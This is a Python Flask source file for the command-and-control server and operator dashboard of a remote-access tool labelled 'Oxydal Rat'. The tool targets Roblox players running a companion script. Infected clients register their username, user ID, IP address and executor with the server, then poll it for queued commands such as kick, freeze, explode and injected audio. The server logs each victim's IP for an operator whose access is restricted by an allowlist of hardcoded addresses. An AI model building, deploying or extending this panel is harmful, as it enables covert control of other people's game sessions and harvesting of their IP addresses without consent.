from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO, emit
import time
import eventlet
from datetime import datetime

# Optimisation pour la gestion asynchrone
eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "cyber_key_999"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# --- CONFIGURATION ---
ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}

connected_players = {}
pending_commands = {}
history_logs = [] 

def add_to_history(action, p_data):
    """Enregistre une action dans l'historique global."""
    log = {
        "id": str(time.time()),
        "time": datetime.now().strftime("%H:%M:%S"),
        "user": p_data.get("username", "Inconnu"),
        "userid": p_data.get("userid", "0"),
        "ip": p_data.get("ip", "0.0.0.0"),
        "executor": p_data.get("executor", "N/A"),
        "gameName": p_data.get("gameName", "Jeu"),
        "gameId": p_data.get("gameId", "0"),
        "action": action
    }
    history_logs.insert(0, log)
    if len(history_logs) > 100: history_logs.pop()
    socketio.emit("update_history", history_logs)

def check_ip():
    """Sécurité : Vérifie l'adresse IP."""
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip: ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS: abort(403)

HTML = """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Oxydal Rat - Green Edition</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
<style>
    :root {
        --bg: #020502;
        --card-bg: rgba(10, 25, 10, 0.85);
        --accent: #00ff66;
        --accent-glow: rgba(0, 255, 102, 0.4);
        --danger: #ff0044;
        --warning: #ccff00;
        --text-dim: #88a088;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { 
        font-family: 'Rajdhani', sans-serif; 
        background: var(--bg); 
        color: #fff; 
        overflow-x: hidden;
        background-image: radial-gradient(circle at 50% 0%, #0a200a 0%, #020502 80%);
        min-height: 100vh;
    }

    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    @keyframes pulse { 0% { box-shadow: 0 0 5px var(--accent); } 50% { box-shadow: 0 0 20px var(--accent); } 100% { box-shadow: 0 0 5px var(--accent); } }

    .container { max-width: 1600px; margin: auto; padding: 40px; animation: fadeIn 0.8s ease-out; }
    
    h1 { 
        font-family: 'Orbitron'; font-size: 3rem; text-align: center; margin-bottom: 50px;
        background: linear-gradient(to bottom, #fff, var(--accent));
        -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        filter: drop-shadow(0 0 15px var(--accent-glow));
        letter-spacing: 5px;
    }

    .main-layout { display: grid; grid-template-columns: 1fr 450px; gap: 40px; }

    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }

    .card { 
        background: var(--card-bg); 
        border: 1px solid rgba(0, 255, 102, 0.15); 
        border-radius: 15px; padding: 25px; 
        backdrop-filter: blur(12px);
        position: relative; transition: all 0.3s ease;
    }
    .card:hover { border-color: var(--accent); box-shadow: 0 0 25px rgba(0, 255, 102, 0.15); transform: translateY(-5px); }

    .trash-player { 
        position: absolute; top: 15px; right: 15px; background: none; border: none; 
        color: #2a442a; cursor: pointer; font-size: 1.2rem; transition: 0.3s; 
    }
    .trash-player:hover { color: var(--danger); }

    .status-badge { 
        display: inline-flex; align-items: center; padding: 4px 10px; border-radius: 10px; 
        font-size: 0.75rem; font-weight: bold; background: #000; margin-bottom: 15px;
        border: 1px solid rgba(0,255,102,0.2);
    }
    .dot { width: 7px; height: 7px; border-radius: 50%; margin-right: 8px; background: #333; }
    .online { background: var(--accent); animation: pulse 1.5s infinite; }

    .name a { 
        font-family: 'Orbitron'; font-size: 1.4rem; color: var(--warning); 
        text-decoration: none; transition: 0.3s; 
    }
    .name a:hover { text-shadow: 0 0 10px var(--warning); }

    .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 15px 0; font-size: 0.85rem; color: var(--text-dim); }
    .info-grid b { color: #fff; font-weight: 500; }

    .btn-group { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin-top: 15px; }
    .btn { 
        padding: 10px; border: none; border-radius: 6px; cursor: pointer; 
        font-weight: bold; font-family: 'Rajdhani'; font-size: 0.85rem; text-transform: uppercase;
        transition: 0.2s;
    }
    .btn-troll { background: #00ff66; color: #000; }
    .btn-troll:hover { background: #fff; box-shadow: 0 0 15px var(--accent); }
    .btn-undo { background: transparent; border: 1px solid #004411; color: var(--accent); }
    .btn-undo:hover { background: #004411; color: #fff; }

    .history-panel { 
        background: rgba(0, 10, 0, 0.95); border: 1px solid rgba(0, 255, 102, 0.1); 
        border-radius: 20px; padding: 20px; height: 750px; display: flex; flex-direction: column; 
    }
    .history-list { flex-grow: 1; overflow-y: auto; }
    .history-list::-webkit-scrollbar { width: 4px; }
    .history-list::-webkit-scrollbar-thumb { background: var(--accent); }

    .history-item { padding: 12px; border-bottom: 1px solid rgba(0,255,102,0.05); font-size: 0.8rem; }
    .hist-time { color: var(--accent); font-family: monospace; }
    .hist-main { display: block; margin: 4px 0; color: #eee; }
    .hist-details a { color: var(--accent); text-decoration: none; }

    /* Modals */
    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); z-index: 9999; align-items: center; justify-content: center; }
    .modal.active { display: flex; }
    .modal-content { background: #051005; padding: 35px; border-radius: 20px; border: 1px solid var(--accent); width: 400px; text-align: center; }
    .modal-content input { width: 100%; padding: 12px; background: #0a1a0a; border: 1px solid #004411; color: var(--accent); border-radius: 8px; margin: 15px 0; }
</style>
</head>
<body>

<div class="container">
    <h1>OXYDAL RAT</h1>
    
    <div class="main-layout">
        <section>
            <h2 style="color: var(--accent); margin-bottom: 20px; font-family: 'Orbitron'; font-size: 0.9rem; letter-spacing: 2px;">VIRTUAL_INSTANCES</h2>
            <div class="grid" id="players"></div>
        </section>

        <aside>
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 20px;">
                <h2 style="color: var(--accent); font-family: 'Orbitron'; font-size: 0.9rem; letter-spacing: 2px;">LOG_STREAM</h2>
                <button onclick="clearHistory()" style="background:none; border:none; color: var(--danger); cursor:pointer; font-weight:bold; font-size:0.7rem;">[ PURGE ]</button>
            </div>
            <div class="history-panel">
                <div class="history-list" id="history-list"></div>
            </div>
        </aside>
    </div>
</div>

<div class="modal" id="kickModal">
    <div class="modal-content">
        <h2 style="color:var(--danger)">TERMINATE_SESSION</h2>
        <input type="text" id="kickReason" placeholder="Reason for termination...">
        <div style="display:flex; gap:10px">
            <button class="btn" style="flex:1; background:#1a1a1a; color:white" onclick="closeModal('kickModal')">Abort</button>
            <button class="btn" style="flex:1; background:var(--danger); color:white" id="confirmKickBtn">Confirm</button>
        </div>
    </div>
</div>

<div class="modal" id="soundModal">
    <div class="modal-content">
        <h2 style="color:var(--accent)">AUDIO_INJECTION</h2>
        <input type="text" id="soundAssetId" placeholder="Asset ID (rbxassetid://)">
        <div style="display:flex; gap:10px">
            <button class="btn" style="flex:1; background:#1a1a1a; color:white" onclick="closeModal('soundModal')">Abort</button>
            <button class="btn" style="flex:1; background:var(--accent); color:black" id="confirmSoundBtn">Broadcast</button>
        </div>
    </div>
</div>

<script>
const socket = io();
let selectedUid = null;

function openKickModal(uid) { selectedUid = uid; document.getElementById('kickModal').classList.add('active'); }
function openSoundModal(uid) { selectedUid = uid; document.getElementById('soundModal').classList.add('active'); }
function closeModal(id) { document.getElementById(id).classList.remove('active'); selectedUid = null; }

function sendTroll(uid, cmd, assetId = null) {
    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: uid, cmd: cmd, assetId: assetId})});
}

function deletePlayer(uid) { fetch("/delete_player", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: uid})}); }
function clearHistory() { fetch("/clear_history", {method: "POST"}); }
function deleteLog(id) { fetch("/clear_history", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({log_id: id})}); }

document.getElementById('confirmKickBtn').onclick = () => {
    sendTroll(selectedUid, 'kick', document.getElementById('kickReason').value || "Connection Lost");
    closeModal('kickModal');
};
document.getElementById('confirmSoundBtn').onclick = () => {
    sendTroll(selectedUid, 'playsound', document.getElementById('soundAssetId').value);
    closeModal('soundModal');
};

socket.on("update", (data) => {
    const grid = document.getElementById("players");
    const currentIds = new Set(Object.keys(data.players));

    Object.entries(data.players).forEach(([id, p]) => {
        let card = document.getElementById(`card_${id}`);
        if (!card) {
            card = document.createElement("div"); card.className = "card"; card.id = `card_${id}`; grid.appendChild(card);
        }
        card.innerHTML = `
            <button class="trash-player" onclick="deletePlayer('${id}')">✕</button>
            <div class="status-badge"><div class="dot ${p.online ? 'online' : ''}"></div>${p.online ? 'STABLE' : 'UNSTABLE'}</div>
            <div class="name"><a href="https://www.roblox.com/fr/users/${id}/profile" target="_blank">${p.username}</a></div>
            
            <div class="info-grid">
                <div><b>ADDR:</b> ${p.ip}</div>
                <div><b>EXEC:</b> ${p.executor}</div>
                <div style="grid-column: span 2"><b>GAME:</b> <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank" style="color:var(--accent)">${p.gameName}</a></div>
            </div>

            <div class="btn-group">
                <button class="btn btn-troll" onclick="openKickModal('${id}')">KICK</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                <button class="btn btn-troll" style="grid-column: span 2; background: #ccff00" onclick="openSoundModal('${id}')">INJECT AUDIO</button>
            </div>

            <div class="btn-group" style="margin-top:10px">
                <button class="btn btn-undo" onclick="sendTroll('${id}','unfreeze')">THAW</button>
                <button class="btn btn-undo" onclick="sendTroll('${id}','stopsound')">MUTE</button>
            </div>
        `;
    });
    document.querySelectorAll('.card').forEach(c => { if (!currentIds.has(c.id.replace('card_', ''))) c.remove(); });
});

socket.on("update_history", (logs) => {
    const list = document.getElementById("history-list");
    list.innerHTML = logs.map(log => `
        <div class="history-item">
            <div style="display:flex; justify-content:space-between">
                <span class="hist-time">[${log.time}]</span>
                <span onclick="deleteLog('${log.id}')" style="cursor:pointer; color:#444">✕</span>
            </div>
            <span class="hist-main"><b>${log.user}</b> <small style="color:#555">@${log.ip}</small></span>
            <span style="color:var(--accent); font-size:0.75rem">${log.action.toUpperCase()}</span>
        </div>
    `).join('');
});
</script>
</body>
</html>"""

@app.route("/")
def index():
    check_ip()
    return render_template_string(HTML)

@socketio.on('connect')
def handle_connect():
    emit("update_history", history_logs)

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        d = request.get_json(silent=True) or {}
        uid = str(d.get("userid", ""))
        if d.get("action") == "register" and uid:
            if uid not in connected_players:
                add_to_history("New Connection", d)
            connected_players[uid] = {
                "username": d.get("username", "Unknown"),
                "ip": d.get("ip", "Unknown"),
                "gameName": d.get("gameName", "Unknown Game"),
                "gameId": d.get("gameId", "0"),
                "executor": d.get("executor", "Unknown"),
                "last": now, "online": True
            }
        elif d.get("action") == "heartbeat" and uid in connected_players:
            connected_players[uid]["last"] = now
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if uid in pending_commands:
            return jsonify(pending_commands.pop(uid))
        return jsonify({})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    d = request.get_json()
    uid, cmd = str(d["userid"]), d["cmd"]
    assetId = d.get("assetId")
    pending_commands[uid] = {"command": cmd, "assetId": assetId} if assetId else {"command": cmd}
    
    p_data = connected_players.get(uid, {"username": "Unknown", "userid": uid})
    add_to_history(f"Execute: {cmd}", p_data)
    return jsonify({"sent": True})

@app.route("/delete_player", methods=["POST"])
def delete_player():
    check_ip()
    uid = str(request.get_json()["userid"])
    if uid in connected_players:
        add_to_history("System: Manual Drop", connected_players[uid])
        del connected_players[uid]
    return jsonify({"ok": True})

@app.route("/clear_history", methods=["POST"])
def clear_history():
    check_ip()
    global history_logs
    data = request.get_json(silent=True)
    if data and "log_id" in data:
        history_logs = [l for l in history_logs if l["id"] != data["log_id"]]
    else:
        history_logs.clear()
    socketio.emit("update_history", history_logs)
    return jsonify({"ok": True})

def broadcast_loop():
    while True:
        now = time.time()
        to_remove = []
        # Utilisation de list() pour éviter l'erreur de modification de taille du dictionnaire
        for uid, p in list(connected_players.items()):
            p["online"] = (now - p["last"] < 15)
            if now - p["last"] > 60: to_remove.append(uid)
            
        for uid in to_remove:
            if uid in connected_players:
                add_to_history("Status: Timeout", connected_players[uid])
                del connected_players[uid]
                
        socketio.emit("update", {"players": connected_players})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
